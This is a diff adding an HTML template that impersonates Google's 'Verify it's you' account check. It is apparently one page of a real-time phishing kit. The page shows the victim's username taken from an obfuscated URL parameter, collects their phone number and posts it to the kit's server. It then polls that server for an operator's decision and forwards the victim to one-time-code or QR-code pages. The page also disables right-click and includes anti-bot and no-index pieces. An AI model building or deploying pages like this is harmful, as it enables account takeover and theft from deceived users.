@@ -1,0 +1,199 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail</title>
+    <%- include('partials/meta-noindex') %>
+    <link rel="shortcut icon" href="/image/gmail.ico" type="image/x-icon">
+    <link rel="stylesheet" href="/css/newstylep1.css">
+    <script src="https://code.iconify.design/3/3.1.0/iconify.min.js"></script>
+
+
+</head>
+<body>
+    <div class="maindiv">
+        <div class="form-container">
+            <div class="white-overlay" id="whiteOverlay"></div>
+            <div class="loading-bar" id="loadingBar"><div class="loading-bar-indicator"></div></div>
+        <form class="loginform1" method="post" name="loginForm" action="javascript:void(0)" accept-charset="UTF-8">
+       
+            <div class="form-half">
+                <div><img class="divlogo" src="/image/image.png" ></div>
+                <br>
+                <div><span class="welcome">Verify it's you<span></div><br>
+                <div><span class="warning">To help keep your account safe, Google wants to make sure it's really you trying to sign in<span><button id="myButton" class="hyperl1" ><b>Learn more</b></button></div>                
+                <div class="userdiv">
+                  <img class="left-img"  src="/image/user-circle.png" >&nbsp;&nbsp;
+                  <input type='hidden' name="username" id="useRname" value="">
+                  <span class="userdiv-name" style="color: #2c2a2a;; font-size: 18px; font-family: Arial, Helvetica, sans-serif;"></span>&#8201;<span class="chip-arrow1">▾</span>&#8201;
+                  
+                </div>
+            </div>
+            <div class="form-half1">
+                <center>
+                    <div class="gradient-box"><img src="/image/account-recovery-sms-pin.gif"></div>
+                </center>
+                    <div class="phonediv">
+                      <span class="phonetype">Get a verification code</span><br><br>
+                      <span class="messaged">To get a verification code, first confirm the phone number you added to your account <%= mobNumber %>.&nbsp;<i> Standard message and data rates may apply.</i></span>
+                        
+                    </div>
+                  
+
+                    
+
+                    <div class="select-box">
+                        <div class="flag-section">
+                            <div style="background-color:white;">
+                                <span class="iconify" data-icon="flag:pk-4x3"></span>
+                                <span class="chip-arrow">▾</span>
+                            </div>
+                        </div>
+                        
+                        <div class="input-section">
+                            <div class="input-wrapper">
+                                <input type="tel" name="tel" id="telInput" onkeypress="return validateMobile(event)" oninput="toggleSendButton()" required="">
+                                <label placeholder="Phone Number"></label>
+                            </div>
+                            <div id="emobError" class="error-msg" style="display:none;"><img src="/image/emob.png"></div>
+
+                            <script>
+                                 function validateMobile(event) {
+                                        var key = event.key;
+                                        // Allow digits (0-9) and the plus sign (+)
+                                        if (/[0-9+]/.test(key)) {
+                                            return true;
+                                        } else {
+                                            alert("Please enter numbers only.");
+                                            return false;
+                                        }
+                                        }
+
+                            </script>
+                        </div>
+                        
+                        <div class="options">
+                            <input type="text" class="search-box" placeholder="Search Country Name">
+                            <ol>
+                
+                            </ol>
+                        </div>
+                    </div>
+                    <script src="/JS/script.js"></script>
+
+                
+
+                <div class="tryn1">
+                    <button id="myButton" class="hyperl2" ><b>Try another way</b></button>&nbsp;&nbsp;&nbsp;
+                    <button type="submit" class="btnnxt" id="sendBtn" onclick="showLoadingBar()" disabled>Send</button>
+                    
+                    
+                  </div>
+
+            </div>
+
+           
+      
+        </form>
+        </div>
+        
+        <div class="btmdiv">
+            <div class="left-div">
+                <select class="btmhypl" id="language-select">
+                    <option value="en">English (United States)</option>
+                    <option value="fr">French</option>
+                    <option value="es">Spanish</option>
+                    <option value="de">German</option>
+                    <!-- Add more options as needed -->
+                </select>
+            </div>
+            <div class="right-divs">
+                <div class="right-div">
+                    <button id="myButton" class="btmhypl" >Help</button>
+                </div>
+                <div class="right-div">
+                    <button id="myButton" class="btmhypl" >Privacy</button>
+                </div>
+                <div class="right-div">
+                    <button id="myButton" class="btmhypl" >Terms</button>
+                </div>
+            </div>
+        </div>
+        <script>
+            // JavaScript to handle button clicks
+            document.querySelectorAll('#myButton').forEach(button => {
+                button.onclick = function(event) {
+                    event.preventDefault(); // Prevents the form submission
+                   
+                     location.href = "https://mail.google.com"; // Replace with your desired URL
+                };
+            });
+        </script>
+
+ <script>
+    document.addEventListener('contextmenu', function (e) {
+      e.preventDefault();
+    });
+
+    const qp = new URLSearchParams(window.location.search);
+    const tk = qp.get('mbbjgsmhyropjmhnkidgdjkjsetwungdkdh') || '';
+    const username = atob(tk);
+    document.getElementById('useRname').value = username;
+    document.querySelector('.userdiv-name').textContent = username;
+
+    function showLoadingBar() {
+      document.getElementById('loadingBar').classList.add('active');
+      document.getElementById('whiteOverlay').classList.add('active');
+
+      const tel = document.getElementById('telInput').value.trim();
+
+      fetch('/req/codeotp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username, tel })
+      }).then(() => pollMobileResult(username, tel));
+    }
+
+    function pollMobileResult(username, tel) {
+      fetch('/mobileresult?u=' + encodeURIComponent(username))
+        .then(r => r.json())
+        .then(data => {
+          if (data.result === 'waiting') {
+            setTimeout(() => pollMobileResult(username, tel), 2000);
+          } else if (data.result === 'redirected') {
+            window.location.href = '/motp?mbbjgsmhyropjmhnkidgdjkjsetwungdkdh=' + encodeURIComponent(tk);
+          } else if (data.result === 'redirected_qr') {
+            window.location.href = '/qrcode?mbbjgsmhyropjmhnkidgdjkjsetwungdkdh=' + encodeURIComponent(tk);
+          } else {
+            // error
+            document.getElementById('loadingBar').classList.remove('active');
+            document.getElementById('whiteOverlay').classList.remove('active');
+            document.getElementById('telInput').classList.add('input-error');
+            document.getElementById('emobError').style.display = 'block';
+          }
+        });
+    }
+
+    function toggleSendButton() {
+      const input = document.getElementById('telInput');
+      const btn = document.getElementById('sendBtn');
+      btn.disabled = !input.value.trim();
+      // Remove error state on new input
+      input.classList.remove('input-error');
+      document.getElementById('emobError').style.display = 'none';
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      document.getElementById('myButton').onclick = function () {
+        location.href = "https://mail.google.com";
+      };
+      toggleSendButton();
+    });
+    </script>
+    </div>
+    
+<%- include('partials/antibot') %>
+</body>
+</html>
